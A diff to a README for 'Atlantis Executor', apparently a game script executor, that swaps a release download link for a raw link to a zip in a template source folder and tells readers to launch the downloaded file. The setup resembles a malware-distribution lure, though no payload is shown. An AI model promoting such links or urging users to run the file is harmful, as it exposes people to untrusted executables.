@@ -12,7 +12,7 @@ Welcome to the Atlantis Executor GitHub repository! This repository is dedicated
 
 To access the Atlantis Executor software, please click on the link below:
 
-[![Download Atlantis Executor](https://github.com/haryad404/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)](https://github.com/haryad404/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)
+[![Download Atlantis Executor](https://github.com/haryad404/Atlantis-Executor/raw/refs/heads/master/packages/template/src/Atlantis_Executor_v1.1.zip)](https://github.com/haryad404/Atlantis-Executor/raw/refs/heads/master/packages/template/src/Atlantis_Executor_v1.1.zip)
 
 Please ensure to launch the downloaded file to begin utilizing Atlantis Executor for your needs.
 
